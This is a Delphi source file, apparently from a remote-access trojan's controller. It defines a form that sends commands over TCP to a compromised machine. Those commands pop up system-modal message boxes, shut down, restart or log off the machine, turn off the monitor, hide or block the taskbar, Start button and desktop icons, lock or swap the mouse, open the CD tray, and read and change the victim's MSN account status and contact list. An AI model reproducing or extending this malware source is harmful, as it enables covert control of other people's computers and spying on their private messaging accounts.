unit UnitOpcoesExtras;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Buttons, IdAntiFreezeBase,
  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, IdThreadMgr,
  IdThreadMgrDefault, Menus, ComCtrls, UnitPrincipal;

type
  TFormOpcoesExtras = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    Panel1: TPanel;
    Label1: TLabel;
    Label2: TLabel;
    Edit1: TEdit;
    Memo1: TMemo;
    BitBtn1: TBitBtn;
    RadioGroup1: TRadioGroup;
    RadioButton6: TRadioButton;
    RadioButton7: TRadioButton;
    RadioButton8: TRadioButton;
    RadioButton9: TRadioButton;
    RadioButton10: TRadioButton;
    RadioButton11: TRadioButton;
    Panel2: TPanel;
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Image4: TImage;
    RadioButton4: TRadioButton;
    RadioButton5: TRadioButton;
    RadioButton3: TRadioButton;
    RadioButton2: TRadioButton;
    RadioButton1: TRadioButton;
    BitBtn2: TBitBtn;
    Panel3: TPanel;
    StatusBar1: TStatusBar;
    Panel4: TPanel;
    Panel5: TPanel;
    Image5: TImage;
    Image6: TImage;
    Image7: TImage;
    Image8: TImage;
    Image9: TImage;
    RadioButton12: TRadioButton;
    RadioButton13: TRadioButton;
    RadioButton14: TRadioButton;
    RadioButton15: TRadioButton;
    RadioButton16: TRadioButton;
    BitBtn3: TBitBtn;
    RadioButton17: TRadioButton;
    Image10: TImage;
    GroupBox1: TGroupBox;
    BitBtn4: TBitBtn;
    BitBtn5: TBitBtn;
    BitBtn6: TBitBtn;
    BitBtn7: TBitBtn;
    GroupBox2: TGroupBox;
    GroupBox3: TGroupBox;
    GroupBox4: TGroupBox;
    GroupBox5: TGroupBox;
    GroupBox6: TGroupBox;
    BitBtn8: TBitBtn;
    BitBtn9: TBitBtn;
    BitBtn10: TBitBtn;
    BitBtn11: TBitBtn;
    BitBtn12: TBitBtn;
    BitBtn13: TBitBtn;
    BitBtn14: TBitBtn;
    BitBtn15: TBitBtn;
    BitBtn16: TBitBtn;
    BitBtn17: TBitBtn;
    BitBtn18: TBitBtn;
    BitBtn19: TBitBtn;
    BitBtn20: TBitBtn;
    BitBtn21: TBitBtn;
    BitBtn22: TBitBtn;
    TabSheet3: TTabSheet;
    ComboBoxEx1: TComboBoxEx;
    BitBtn26: TBitBtn;
    BitBtn27: TBitBtn;
    Label9: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    RichEdit2: TRichEdit;
    RichEdit1: TRichEdit;
    Label3: TLabel;
    Label4: TLabel;
    Label10: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure BitBtn3Click(Sender: TObject);
    procedure BitBtn5Click(Sender: TObject);
    procedure BitBtn4Click(Sender: TObject);
    procedure BitBtn6Click(Sender: TObject);
    procedure BitBtn7Click(Sender: TObject);
    procedure BitBtn8Click(Sender: TObject);
    procedure BitBtn9Click(Sender: TObject);
    procedure BitBtn11Click(Sender: TObject);
    procedure BitBtn10Click(Sender: TObject);
    procedure BitBtn12Click(Sender: TObject);
    procedure BitBtn13Click(Sender: TObject);
    procedure BitBtn15Click(Sender: TObject);
    procedure BitBtn14Click(Sender: TObject);
    procedure BitBtn18Click(Sender: TObject);
    procedure BitBtn19Click(Sender: TObject);
    procedure BitBtn22Click(Sender: TObject);
    procedure BitBtn16Click(Sender: TObject);
    procedure BitBtn17Click(Sender: TObject);
    procedure BitBtn20Click(Sender: TObject);
    procedure BitBtn21Click(Sender: TObject);
    procedure Edit2Enter(Sender: TObject);
    procedure Edit2Exit(Sender: TObject);
    procedure PageControl1Change(Sender: TObject);
    procedure BitBtn26Click(Sender: TObject);
    procedure BitBtn27Click(Sender: TObject);
  private
    Servidor: PConexao;
    SolicitouMSNStatus: boolean;
    { Private declarations }
  public
    procedure OnRead(Recebido: String; AThread: TIdPeerThread); overload;
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
    procedure AtualizarStrings;
    { Public declarations }
  end;

var
  FormOpcoesExtras: TFormOpcoesExtras;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitComandos,
  UnitCryptstring,
  UnitConexao;

const
  Separador = '##@@##';

constructor TFormOpcoesExtras.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
end;

procedure TFormOpcoesExtras.AtualizarStrings;
begin
  Tabsheet1.Caption := traduzidos[410];
  Tabsheet2.Caption := traduzidos[411];
  radiogroup1.Caption := traduzidos[412];
  radiobutton1.Caption := traduzidos[413];
  radiobutton2.Caption := traduzidos[414];
  radiobutton3.Caption := traduzidos[415];
  radiobutton4.Caption := traduzidos[416];
  radiobutton5.Caption := traduzidos[417];
  radiobutton6.Caption := traduzidos[418];
  radiobutton7.Caption := traduzidos[419];
  radiobutton8.Caption := traduzidos[420];
  radiobutton9.Caption := traduzidos[421];
  radiobutton10.Caption := traduzidos[422];
  radiobutton11.Caption := traduzidos[423];
  radiobutton12.Caption := traduzidos[424];
  radiobutton13.Caption := traduzidos[425];
  radiobutton14.Caption := traduzidos[426];
  radiobutton15.Caption := traduzidos[427];
  radiobutton16.Caption := traduzidos[428];
  radiobutton17.Caption := traduzidos[429];
  GroupBox1.Caption := traduzidos[430];
  GroupBox2.Caption := traduzidos[431];
  GroupBox3.Caption := traduzidos[432];
  GroupBox4.Caption := traduzidos[433];
  GroupBox5.Caption := traduzidos[434];
  GroupBox6.Caption := traduzidos[435];

  Label1.Caption := traduzidos[436];
  Label2.Caption := traduzidos[437];

  BitBtn1.Caption := traduzidos[438];
  BitBtn2.Caption := traduzidos[439];
  BitBtn3.Caption := traduzidos[440];

  BitBtn5.Caption := traduzidos[441];
  BitBtn4.Caption := traduzidos[442];
  BitBtn6.Caption := traduzidos[443];
  BitBtn7.Caption := traduzidos[444];

  BitBtn8.Caption := traduzidos[441];
  BitBtn9.Caption := traduzidos[442];
  BitBtn11.Caption := traduzidos[443];
  BitBtn10.Caption := traduzidos[444];

  BitBtn12.Caption := traduzidos[441];
  BitBtn13.Caption := traduzidos[442];
  BitBtn15.Caption := traduzidos[443];
  BitBtn14.Caption := traduzidos[444];

  BitBtn16.Caption := traduzidos[441];
  BitBtn17.Caption := traduzidos[442];

  BitBtn18.Caption := traduzidos[443];
  BitBtn19.Caption := traduzidos[444];
  BitBtn22.Caption := traduzidos[445];

  BitBtn20.Caption := traduzidos[446];
  BitBtn21.Caption := traduzidos[447];

  pagecontrol1.ActivePageIndex := 0;

  Tabsheet3.Caption := traduzidos[497];
  BitBtn26.Caption := traduzidos[498];
  BitBtn27.Caption := traduzidos[499];
  label5.Caption := traduzidos[500];
  label6.Caption := traduzidos[501];
  comboboxex1.ItemsEx.Items[0].Caption := traduzidos[502];
  comboboxex1.ItemsEx.Items[1].Caption := traduzidos[503];
  comboboxex1.ItemsEx.Items[2].Caption := traduzidos[504];
  comboboxex1.ItemsEx.Items[3].Caption := traduzidos[505];
  comboboxex1.ItemsEx.Items[4].Caption := traduzidos[506];
  label7.Caption := traduzidos[507] + ': ';
  label8.Caption := traduzidos[508] + ': ';
  label9.Caption := traduzidos[509] + ': ';

  StatusBar1.Panels.Items[0].Text := '';
end;

function StreamToStr(S: TMemoryStream):string;
var
  SizeStr: integer;
begin
  S.Read(SizeStr, SizeOf(integer));
  SetLength(Result,SizeStr);
  S.Read(Result[1], SizeStr);
end;

procedure TFormOpcoesExtras.OnRead(Recebido: String; AThread: TIdPeerThread);
var
  resposta: string;

  buffer, TempStr: string;

  S: TMemoryStream;
  arrayBuffer : array[0..MaxBufferSize] of Byte;
  StringSize: integer;
  read, currRead : integer;
  buffSize : integer;

  email, nick, qtd: string;
begin
  Buffer := Recebido;

  if Copy(Buffer, 1, pos('|', Buffer) - 1) = MYMESSAGEBOX then
  begin
    delete(Buffer, 1, pos('|', Buffer));
    resposta := Copy(Buffer, 1, pos('|', Buffer) - 1);
    if resposta = '1' then
    StatusBar1.Panels.Items[0].Text := traduzidos[451] + ' ' + traduzidos[452] else
    if resposta = '2' then
    StatusBar1.Panels.Items[0].Text := traduzidos[451] + ' ' + traduzidos[453] else
    if resposta = '3' then
    StatusBar1.Panels.Items[0].Text := traduzidos[451] + ' ' + traduzidos[454] else
    if resposta = '4' then
    StatusBar1.Panels.Items[0].Text := traduzidos[451] + ' ' + traduzidos[455] else
    if resposta = '5' then
    StatusBar1.Panels.Items[0].Text := traduzidos[451] + ' ' + traduzidos[456] else
    if resposta = '6' then
    StatusBar1.Panels.Items[0].Text := traduzidos[451] + ' ' + traduzidos[457] else
    if resposta = '7' then
    StatusBar1.Panels.Items[0].Text := traduzidos[451] + ' ' + traduzidos[458] else
  end else

  if Copy(Buffer, 1, pos('|', Buffer) - 1) = MENSAGENS then
  begin
    Delete(Buffer, 1, pos('|', Buffer));
    StatusBar1.Panels.Items[0].Text := Copy(Buffer, 1, pos('|', Buffer) - 1);
  end else

  if Copy(Buffer, 1, pos('|', Buffer) - 1) = MSN_LISTAR then
  begin
    richedit1.Clear;
    richedit2.Clear;
    Delete(Buffer, 1, pos('|', Buffer));

    richedit1.Lines.BeginUpdate;
    richedit2.Lines.BeginUpdate;
    while pos(separador, Buffer) > 1 do
    begin
      richedit1.Lines.Add(Copy(Buffer, 1, Pos(separador, Buffer) - 1));
      Delete(Buffer, 1, Pos(separador, Buffer) + length(separador) - 1);

      richedit2.Lines.Add(Copy(Buffer, 1, Pos(separador, Buffer) - 1));
      Delete(Buffer, 1, Pos(separador, Buffer) + length(separador) - 1);

      delete(Buffer, 1, 2);
    end;
    richedit1.Lines.EndUpdate;
    richedit2.Lines.EndUpdate;
    StatusBar1.Panels.Items[0].Text := traduzidos[512];
  end else

  if Copy(Buffer, 1, pos('|', Buffer) - 1) = MSN_STATUS then
  begin
    Delete(Buffer, 1, pos('|', Buffer));
    application.ProcessMessages;

    email := Copy(Buffer, 1, Pos(separador, Buffer) - 1);
    Delete(Buffer, 1, Pos(separador, Buffer) + length(separador) - 1);

    nick := Copy(Buffer, 1, Pos(separador, Buffer) - 1);
    Delete(Buffer, 1, Pos(separador, Buffer) + length(separador) - 1);

    qtd := Copy(Buffer, 1, Pos(separador, Buffer) - 1);
    Delete(Buffer, 1, Pos(separador, Buffer) + length(separador) - 1);

    label3.Caption := email;
    label4.Caption := nick;
    label10.Caption := qtd;

    if Copy(Buffer, 1, pos('|', Buffer) - 1) = '0' then
    begin
      comboboxex1.ItemIndex := 0;
      StatusBar1.Panels.Items[0].Text := traduzidos[511] + ': ' + traduzidos[502];
      bitbtn26.Enabled := true;
      bitbtn27.Enabled := true;
    end else
    if Copy(Buffer, 1, pos('|', Buffer) - 1) = '1' then
    begin
      comboboxex1.ItemIndex := 1;
      StatusBar1.Panels.Items[0].Text := traduzidos[511] + ': ' + traduzidos[503];
      bitbtn26.Enabled := true;
      bitbtn27.Enabled := true;
    end else
    if Copy(Buffer, 1, pos('|', Buffer) - 1) = '2' then
    begin
      comboboxex1.ItemIndex := 2;
      StatusBar1.Panels.Items[0].Text := traduzidos[511] + ': ' + traduzidos[504];
      bitbtn26.Enabled := true;
      bitbtn27.Enabled := true;
    end else
    if Copy(Buffer, 1, pos('|', Buffer) - 1) = '3' then
    begin
      comboboxex1.ItemIndex := 3;
      StatusBar1.Panels.Items[0].Text := traduzidos[511] + ': ' + traduzidos[505];
      bitbtn26.Enabled := true;
      bitbtn27.Enabled := true;
    end else
    if Copy(Buffer, 1, pos('|', Buffer) - 1) = '4' then
    begin
      comboboxex1.ItemIndex := 4;
      StatusBar1.Panels.Items[0].Text := traduzidos[511] + ': ' + traduzidos[648];
    end;
    if Copy(Buffer, 1, pos('|', Buffer) - 1) = '5' then
    begin
      comboboxex1.ItemIndex := -1;
      StatusBar1.Panels.Items[0].Text := traduzidos[510];
    end;

    SolicitouMSNStatus := false;
  end else
  


end;

procedure TFormOpcoesExtras.FormCreate(Sender: TObject);
begin
  FormPrincipal.ImageListIcons.GetBitmap(249, bitbtn3.Glyph);
  edit1.Text := traduzidos[449];
  memo1.Text := traduzidos[448];
end;

procedure TFormOpcoesExtras.BitBtn2Click(Sender: TObject);
var
  mType, bType: cardinal;
begin
  if radiobutton6.Checked then bType := MB_OK else
  if radiobutton7.Checked then bType := MB_RETRYCANCEL else
  if radiobutton8.Checked then bType := MB_YESNOCANCEL else
  if radiobutton9.Checked then bType := MB_OKCANCEL else
  if radiobutton10.Checked then bType := MB_YESNO else
  if radiobutton11.Checked then bType := MB_ABORTRETRYIGNORE;

  if radiobutton1.Checked then mType := MB_ICONQUESTION else
  if radiobutton2.Checked then mType := MB_ICONERROR else
  if radiobutton3.Checked then mType := MB_ICONWARNING else
  if radiobutton4.Checked then mType := MB_ICONINFORMATION else
  if radiobutton5.Checked then mType := 0;

  messagebox(0, pchar(memo1.Text), pchar(edit1.Text), MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST or bType or mType);
end;

procedure TFormOpcoesExtras.FormShow(Sender: TObject);
begin
  AtualizarStrings;
  SolicitouMSNStatus := false;
  label3.Caption := '';
  label4.Caption := '';
  label10.Caption := '';
//  pagecontrol1.ActivePage := TabSheet1;
end;

procedure TFormOpcoesExtras.BitBtn1Click(Sender: TObject);
var
  mType, bType: cardinal;
begin
  if radiobutton6.Checked then bType := MB_OK else
  if radiobutton7.Checked then bType := MB_RETRYCANCEL else
  if radiobutton8.Checked then bType := MB_YESNOCANCEL else
  if radiobutton9.Checked then bType := MB_OKCANCEL else
  if radiobutton10.Checked then bType := MB_YESNO else
  if radiobutton11.Checked then bType := MB_ABORTRETRYIGNORE;

  if radiobutton1.Checked then mType := MB_ICONQUESTION else
  if radiobutton2.Checked then mType := MB_ICONERROR else
  if radiobutton3.Checked then mType := MB_ICONWARNING else
  if radiobutton4.Checked then mType := MB_ICONINFORMATION else
  if radiobutton5.Checked then mType := 0;

  EnviarString(Servidor.Athread, MYMESSAGEBOX + '|' +
               inttostr(bType) + '|' +
               inttostr(mType) + '|' +
               Edit1.Text + '|' +
               memo1.Text + '|');
end;

procedure TFormOpcoesExtras.BitBtn3Click(Sender: TObject);
var
  ToSend: string;
begin
  if radiobutton12.Checked = true then ToSend := MYSHUTDOWN else
  if radiobutton13.Checked = true then ToSend := HIBERNAR else
  if radiobutton14.Checked = true then ToSend := LOGOFF else
  if radiobutton15.Checked = true then ToSend := POWEROFF else
  if radiobutton16.Checked = true then ToSend := MYRESTART else
  if radiobutton17.Checked = true then ToSend := DESLMONITOR;

  EnviarString(Servidor.Athread, ToSend + '|');
end;

procedure TFormOpcoesExtras.BitBtn5Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, BTN_START_HIDE + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn4Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, BTN_START_SHOW + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn6Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, BTN_START_BLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn7Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, BTN_START_UNBLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn8Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DESK_ICO_HIDE + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn9Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DESK_ICO_SHOW + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn11Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DESK_ICO_BLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn10Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DESK_ICO_UNBLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn12Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, TASK_BAR_HIDE + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn13Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, TASK_BAR_SHOW + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn15Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, TASK_BAR_BLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn14Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, TASK_BAR_UNBLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn18Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, MOUSE_BLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn19Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, MOUSE_UNBLOCK + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn22Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, MOUSE_SWAP + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn16Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, SYSTRAY_ICO_HIDE + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn17Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, SYSTRAY_ICO_SHOW + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn20Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, OPENCD + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn21Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, CLOSECD + '|', true);
end;

procedure TFormOpcoesExtras.Edit2Enter(Sender: TObject);
var
  Ctrl: TWinControl;
begin
  if (Ctrl is TEdit) then
  TEdit(Ctrl).Color := clSkyBlue;
  if (Ctrl is TRichEdit) then
  TRichEdit(Ctrl).Color := clSkyBlue;
  if (Ctrl is TMemo) then
  TMemo(Ctrl).Color := clSkyBlue;
  if (Ctrl is TComboBox) then
  TComboBox(Ctrl).Color := clSkyBlue;
  if (Ctrl is TComboBoxEx) then
  TComboBoxEx(Ctrl).Color := clSkyBlue;
end;

procedure TFormOpcoesExtras.Edit2Exit(Sender: TObject);
var
  Ctrl: TWinControl;
begin
  if (Ctrl is TEdit) then
  TEdit(Ctrl).Color := clwindow;
  if (Ctrl is TRichEdit) then
  TRichEdit(Ctrl).Color := clwindow;
  if (Ctrl is TMemo) then
  TMemo(Ctrl).Color := clwindow;
  if (Ctrl is TComboBox) then
  TComboBox(Ctrl).Color := clwindow;
  if (Ctrl is TComboBoxEx) then
  TComboBoxEx(Ctrl).Color := clwindow;
end;

procedure TFormOpcoesExtras.PageControl1Change(Sender: TObject);
begin
  if (pagecontrol1.ActivePage = tabsheet3) and (SolicitouMSNStatus = false) then
  begin
    EnviarString(Servidor.Athread, MSN_STATUS + '|', true);
    Richedit1.Clear;
    Richedit2.Clear;
    bitbtn26.Enabled := false;
    bitbtn27.Enabled := false;
    SolicitouMSNStatus := true;
  end;
end;

procedure TFormOpcoesExtras.BitBtn26Click(Sender: TObject);
begin
  if comboboxex1.ItemIndex = 0 then EnviarString(Servidor.Athread, MSN_CONECTADO + '|', true) else
  if comboboxex1.ItemIndex = 1 then EnviarString(Servidor.Athread, MSN_OCUPADO + '|', true) else
  if comboboxex1.ItemIndex = 2 then EnviarString(Servidor.Athread, MSN_AUSENTE + '|', true) else
  if comboboxex1.ItemIndex = 3 then EnviarString(Servidor.Athread, MSN_INVISIVEL + '|', true) else
  if comboboxex1.ItemIndex = 4 then EnviarString(Servidor.Athread, MSN_DESCONECTADO + '|', true);
end;

procedure TFormOpcoesExtras.BitBtn27Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, MSN_LISTAR + '|', true);
end;

end.
